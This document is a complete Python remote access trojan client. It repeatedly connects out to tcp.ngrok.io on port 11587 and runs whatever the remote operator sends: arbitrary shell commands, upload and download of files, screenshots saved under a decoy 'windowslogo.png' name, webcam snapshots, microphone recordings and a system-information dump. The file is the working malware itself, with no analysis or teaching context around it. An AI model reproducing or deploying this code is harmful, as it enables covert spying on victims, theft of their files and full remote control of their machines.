import socket
import time
import os,platform
import subprocess
from threading import Thread
import pyscreenshot as ImageGrab
import random
import cv2
from datetime import datetime
import secrets
import pyaudio
import wave


    


################################## THE FUNCTIONS TO BE CALLED ##################################

def sysInfo(s):
    try:
       
        oss = os.name
        osName = platform.system()
        osVersion = platform.version()
        architecture = platform.architecture()
        cpu_count = os.cpu_count()

        data_collected = f'''

                ============================================================================

                Os type: {oss}
                Running os:{osName}
                Os version: {osVersion}
                Device architecture: {architecture}
                Device CPU count: {cpu_count}

                ============================================================================
        
        '''
        s.send(data_collected.encode('utf-8'))

    except Exception as error:
        print(error) 

def sendingFileMechanism(s, filepath):
    filesize = os.path.getsize(filepath)
    s.send(str(filesize).encode())
    signal_to_go = s.recv(1024)
    if signal_to_go.decode() == 'ready':
        ImageFile = open(filepath, 'rb')
        data = ImageFile.read(1024)
        while (data):
            s.send(data)
            data = ImageFile.read(1024)
        ImageFile.close()
        s.send('complete'.encode())
        os.remove(filepath)


def screenShot(s):
    image = ImageGrab.grab()

    path1 = os.path.expanduser('~') + '/Documents/windowslogo.png'
    path2 = os.path.expanduser('~') + '/Pictures/windowslogo.png'
    pathlist = [path1,path2]
    filepath = random.choice(pathlist)
            #t = time.ctime(time.time())
            #name_img = str(t + '.png') 
            
    image.save(filepath)
    sendingFileMechanism(s, filepath)


def sendFile(name, sock):
    s.send('sending file'.encode())
    filename =str(os.getcwd() + os.sep + name)
    if os.path.isfile(name):
        s.send('exists'.encode())
        sizerequest = s.recv(1024)
        filesize = os.path.getsize(filename)
        s.send(str(filesize).encode())
        requestDownload = s.recv(1024)
        requestDownload = requestDownload.decode()
        if str(requestDownload).upper() == 'READY':
            f = open(filename, 'rb')
            data = f.read(1024)
            while (data):
                s.send(data)
                data = f.read(1024)
            s.send('complete'.encode())
            f.close()
        else:
            pass
    else:
        s.send('[-] File does not exist.'.encode())

def downloadMechanism(s,filename, filemode):
    #datatype conversions
    filename = str(filename)
    filemode = str(filemode)
    f = open(filename, filemode)
    data = s.recv(1024)
    
    while not ('complete' in str(data)):
        f.write(data)
        data = s.recv(1024)
    f.close()
   
   
def downloadfile(filename, s):
    fileLocation = str(os.getcwd() + os.sep + str(filename))
    downloadMechanism(s, fileLocation, 'wb')
    


def webcam(s):
    cam = cv2.VideoCapture(0)
    ret, image = cam.read()
    del(cam)
    filename = str(secrets.token_hex(4)) + '.png'
    cv2.imwrite(filename, image)
    sendingFileMechanism(s,filename)



def sound(s, seconds):
    fs = 44100
    
    FORMAT = pyaudio.paInt16
    CHANNELS = 2
    RATE = 44100
    CHUNK = 1024
    RECORD_SECONDS = int(seconds)
    WAVE_OUTPUT_FILENAME = "systemsound.wav"
    
    audio = pyaudio.PyAudio()
    
    # start Recording
    stream = audio.open(format=FORMAT, channels=CHANNELS,
                    rate=RATE, input=True,
                    frames_per_buffer=CHUNK)
    
    frames = []
    
    for i in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
        data = stream.read(CHUNK)
        frames.append(data)
    
    
    
    # stop Recording
    stream.stop_stream()
    stream.close()
    audio.terminate()
    
    waveFile = wave.open(WAVE_OUTPUT_FILENAME, 'wb')
    waveFile.setnchannels(CHANNELS)
    waveFile.setsampwidth(audio.get_sample_size(FORMAT))
    waveFile.setframerate(RATE)
    waveFile.writeframes(b''.join(frames))
    waveFile.close()
    filepath = str(os.getcwd() + os.sep + WAVE_OUTPUT_FILENAME)
    sendingFileMechanism(s, filepath)
    os.remove(str(filepath)) 

############################################ END ###############################################


def get():
    try:
        while True:
            data = s.recv(2024)

            command = data.decode()

            if len(command) > 0:

                if command[:2] == 'cd':
                    os.chdir(command[3:])
                    cwd = os.getcwd()
                    s.send(str(cwd).encode())
               

                elif command == 'sys info':
                    sysInfo(s)
                    continue


                elif command == 'getscreen':
                    s.send('screenshot'.encode())
                    t = Thread(target=screenShot,args=[s])
                    t.daemon = True
                    t.start()
                    t.join()
                    continue
                
                elif command == 'getcamera':
                    s.send('webcam'.encode())
                    t = Thread(target=webcam,args=[s])
                    t.daemon = True
                    t.start()
                    t.join()
                    continue

                elif 'getfile -n' in command:
                    filename = command[11:]
                    t = Thread(target=sendFile,args=[filename, s])
                    t.daemon = True
                    t.start()
                    t.join()
                    continue
                
                elif 'getsound' in command:
                    s.send('sending sound'.encode())
                    time = s.recv(1024).decode()
                    if time == ' ':
                        continue
                    else:
                        time = int(time)
                        t = Thread(target=sound,args=[s, time])
                        t.daemon = True
                        t.start()
                        t.join()
                        continue
                
                
                    
                elif 'uploadfile' in command:
                    s.send('upload'.encode())
                    filename = s.recv(1024).decode()
                    t = Thread(target=downloadfile,args=[filename, s])
                    t.daemon = True
                    t.start()
                    t.join()
                    continue

                else:
                    cmd = subprocess.Popen(data[:].decode('utf-8'),shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
                    output_byte = cmd.stdout.read() + cmd.stderr.read()
                    output_str = output_byte.decode('utf-8')
                    currentWD = os.getcwd() + '>'
                    encode = str.encode(output_str + currentWD)
                    s.send(encode)


            else:
                s.send(str(" ").encode())

    except Exception as error:
        continious_connection()
       


        

def continious_connection():
    ###creating the socket for listening for incoming connections
    global s
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    host = "tcp.ngrok.io"
    port = 11587
    while True:
        try:
            connection = s.connect((host, port))
            break
        except:
            continue
    ###creating the get thread to handel communications.
    t = Thread(target=get)
    t.daemon = True
    t.start()
    t.join()
 



continious_connection()

